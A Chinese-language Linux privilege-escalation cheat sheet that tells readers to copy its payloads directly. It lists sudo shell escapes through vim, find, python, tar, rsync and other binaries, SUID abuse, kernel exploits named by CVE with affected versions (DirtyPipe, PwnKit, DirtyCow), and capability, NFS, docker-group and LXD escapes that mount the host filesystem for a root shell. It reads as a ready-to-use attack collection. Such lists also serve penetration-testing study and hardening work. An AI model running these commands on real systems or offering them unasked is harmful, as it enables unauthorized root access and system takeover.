# 提权 Payload 速查

> 按成功率排序，直接复制使用

## sudo 提权（最快）

```bash
# 先用 sudo -l 查看当前用户可执行的命令
sudo -l

# 常见sudo提权方法
sudo vim -c ':!/bin/bash'
sudo find / -exec /bin/bash \;
sudo python3 -c 'import os;os.system("/bin/bash")'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo less /etc/passwd  →  !/bin/bash
sudo man man  →  !/bin/bash
sudo git -p help  →  !/bin/bash
sudo nmap --interactive  →  !sh
sudo perl -e 'exec "/bin/bash";'
sudo ruby -e 'exec "/bin/bash"'
sudo lua -e 'os.execute("/bin/bash")'
sudo zip /tmp/test.zip /etc/hosts -T -TT 'sh #'
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
sudo env /bin/bash
sudo /bin/bash -p
```

## SUID 提权

```bash
# 查找SUID文件
find / -perm -4000 -type f 2>/dev/null

# 常见SUID提权
# bash (SUID)
bash -p
# 如果bash -p不行，用：
/bin/bash -p

# find (SUID: find, exec)
find / -exec /bin/bash -p \; -quit

# vim (SUID)
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash")'
```

## 内核提权

```
CVE-2022-0847 (DirtyPipe) — 内核5.8-5.16.11
CVE-2021-4034 (PwnKit) — pkexec
CVE-2021-3156 (Baron Samedit) — sudo 1.8.2-1.8.31p2
CVE-2016-5195 (DirtyCow) — 内核2.6.22-4.8.3
```

## 其他提权

```bash
# Capabilities
getcap -r / 2>/dev/null
# cap_setuid+ep → python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'

# NFS no_root_squash
showmount -e target
mkdir /tmp/nfs && mount -t nfs target:/ /tmp/nfs
# 在/tmp/nfs写入SUID bash

# Docker组
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# LXD组
lxc init ubuntu:22.04 privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc && lxc exec privesc /bin/bash
```